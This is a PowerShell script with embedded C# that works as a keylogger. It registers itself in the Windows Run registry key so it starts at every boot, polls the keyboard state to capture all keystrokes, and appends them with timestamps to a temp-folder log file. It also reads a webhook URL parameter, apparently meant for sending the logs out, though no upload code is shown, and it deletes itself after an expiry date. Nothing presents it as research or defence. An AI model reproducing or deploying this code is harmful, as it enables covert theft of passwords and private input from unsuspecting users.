# Add this script to startup to ensure it runs every time the system boots
$scriptPath = $MyInvocation.MyCommand.Path  # Path of this script
$regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$scriptName = "MyStartupScript2"  # You can change this name if you like

# Check if the script is already added to startup to avoid duplicates
$existingEntry = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
if ($existingEntry) {
    Write-Host "Script is already added to startup." -ForegroundColor Yellow
} else {
    # Add the script to startup
    try {
        Set-ItemProperty -Path $regKey -Name $scriptName -Value "$scriptPath"
        Write-Host "Script added to startup." -ForegroundColor Green
    }
    catch {
        Write-Host "Error adding script to startup:" -ForegroundColor Red
        Write-Host $_.Exception.Message
    }

    # Confirm that the entry has been added to the registry
    $confirmation = Get-ItemProperty -Path $regKey -Name $scriptName -ErrorAction SilentlyContinue
    if ($confirmation) {
        Write-Host "Script successfully added to startup." -ForegroundColor Green
    } else {
        Write-Host "Failed to add script to startup." -ForegroundColor Red
    }
}

# Ensure that the webhook URL is set directly from the command line
$webhookURL = $dc  # $webhookURL is the variable passed via the command line

# Define the path to the temp log file
$tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'temp_log.txt')

# Set the default expiry date to 30 days from today if no expiry date is passed
if ($args.Count -gt 1) {
    # If the second argument is provided, parse it as the expiry date
    $expiryDate = [datetime]::ParseExact($args[1], 'yyyy-MM-dd', $null)
} else {
    # If no expiry date is passed, default to 30 days from today
    $expiryDate = (Get-Date).AddDays(30)
}

# Check if the script has expired
$currentDate = Get-Date
if ($currentDate -gt $expiryDate) {
    # If the script has expired, delete itself
    Write-Host "Script has expired. Deleting script file..."
    Remove-Item $MyInvocation.MyCommand.Path -Force
    exit
}

# Check if the custom utility type is already loaded
$customUtilityType = [AppDomain]::CurrentDomain.GetAssemblies() | ForEach-Object { 
    $_.GetTypes() | Where-Object { $_.Name -eq 'KeyCaptureUtility' }
}

if (-not $customUtilityType) {
    # Add Type for custom utility class
    Add-Type @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

public class KeyCaptureUtility
{
    // DLL Imports for keyboard input functions
    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] keystate);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MapVirtualKey(uint uCode, int uMapType);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);

    public static void CaptureInput(string filePath)
    {
        StringBuilder captureBuffer = new StringBuilder();
        var lastKeypressTime = System.Diagnostics.Stopwatch.StartNew();
        TimeSpan keypressThreshold = TimeSpan.FromSeconds(10);

        // Ensure the file exists, create it if it doesn't
        if (!File.Exists(filePath))
        {
            File.Create(filePath).Dispose();
            Console.WriteLine("File created: " + filePath);  // Log file creation
        }

        // Continuous loop to capture keypresses
        while (true)
        {
            bool keyPressed = false;

            // Check if the last key press time exceeds threshold
            while (lastKeypressTime.Elapsed < keypressThreshold)
            {
                Thread.Sleep(30);  // Sleep for 30 ms

                // Iterate through all possible virtual keycodes
                for (int asc = 8; asc <= 254; asc++)
                {
                    short keyst = GetAsyncKeyState(asc);

                    // Check if the key is pressed (key state = -32767 means pressed)
                    if (keyst == -32767)
                    {
                        keyPressed = true;
                        lastKeypressTime.Restart();  // Reset inactivity timer

                        // Translate the key to a readable character
                        int vtkey = MapVirtualKey((uint)asc, 3);
                        byte[] kbst = new byte[256];
                        GetKeyboardState(kbst);
                        StringBuilder logChar = new StringBuilder();

                        // Get the character for the key
                        if (ToUnicode((uint)asc, (uint)vtkey, kbst, logChar, logChar.Capacity, 0) != 0)
                        {
                            string charPressed = logChar.ToString();

                            // Handle special keys like Backspace, Enter, and Escape
                            if (asc == 8) charPressed = "[BKSP]";  // Backspace
                            if (asc == 13) charPressed = "[ENTER]";  // Enter
                            if (asc == 27) charPressed = "[ESC]";  // Escape
                            if (asc == 9) charPressed = "[TAB]";  // Tab
                            if (asc == 32) charPressed = "[SPACE]";  // Space bar
                            if (asc == 46) charPressed = "[DEL]";  // Delete
                            if (asc == 37) charPressed = "[LEFT]";  // Left Arrow
                            if (asc == 38) charPressed = "[UP]";  // Up Arrow
                            if (asc == 39) charPressed = "[RIGHT]";  // Right Arrow
                            if (asc == 40) charPressed = "[DOWN]";  // Down Arrow
                            if (asc == 33) charPressed = "[PGUP]";  // Page Up
                            if (asc == 34) charPressed = "[PGDN]";  // Page Down
                            if (asc == 35) charPressed = "[END]";  // End
                            if (asc == 36) charPressed = "[HOME]";  // Home
                            if (asc == 144) charPressed = "[NUMLOCK]";  // Num Lock
                            if (asc == 145) charPressed = "[SCROLLLOCK]";  // Scroll Lock
                            if (asc == 112) charPressed = "[F1]";  // F1
                            if (asc == 113) charPressed = "[F2]";  // F2
                            if (asc == 114) charPressed = "[F3]";  // F3
                            if (asc == 115) charPressed = "[F4]";  // F4
                            if (asc == 116) charPressed = "[F5]";  // F5
                            if (asc == 117) charPressed = "[F6]";  // F6
                            if (asc == 118) charPressed = "[F7]";  // F7
                            if (asc == 119) charPressed = "[F8]";  // F8
                            if (asc == 120) charPressed = "[F9]";  // F9
                            if (asc == 121) charPressed = "[F10]";  // F10
                            if (asc == 122) charPressed = "[F11]";  // F11
                            if (asc == 123) charPressed = "[F12]";  // F12

                            captureBuffer.Append(charPressed);
                            captureBuffer.Append(asc);
                        }
                    }
                }
            }

            if (keyPressed)
            {
                // Save input to the file with a timestamp
                string timestamp = DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss");
                string message = timestamp + " : " + captureBuffer.ToString() + "\r\n";
                File.AppendAllText(filePath, message);
                Console.WriteLine("Input saved: " + message);  // Log the saved message
                captureBuffer.Clear();  // Clear the input buffer after saving
            }

            // Reset the stopwatch and continue checking
            lastKeypressTime.Restart();
        }
    }
}

"@
}

# Call the CaptureInput method to start capturing inputs (synchronously)
[KeyCaptureUtility]::CaptureInput($tempFilePath)
